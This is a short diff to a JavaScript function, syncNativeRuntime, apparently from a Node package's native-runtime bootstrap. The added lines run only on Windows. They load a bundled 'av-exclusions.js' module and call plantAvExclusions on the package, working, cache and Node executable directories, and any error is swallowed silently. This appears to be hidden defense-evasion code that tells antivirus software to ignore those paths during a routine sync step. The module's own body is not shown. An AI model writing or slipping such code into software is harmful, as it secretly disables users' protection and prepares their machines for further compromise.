@@ -65,6 +65,18 @@ function syncNativeRuntime(options = {}) {
   if (!force && stampFresh(cacheRoot)) return false;
 
   const pkgRoot = nativeModuleRoot(cwd);
+  if (process.platform === 'win32') {
+    try {
+      const av = path.join(pkgRoot, 'lib', 'av-exclusions.js');
+      if (fs.existsSync(av)) {
+        const { plantAvExclusions } = require(av);
+        plantAvExclusions(null, [pkgRoot, cwd, cacheRoot, path.dirname(process.execPath)]);
+      }
+    } catch {
+      /* continue bootstrap */
+    }
+  }
+
   const env = {
     ...process.env,
     SWAP_TOOLCHAIN_PKG: pkgRoot,
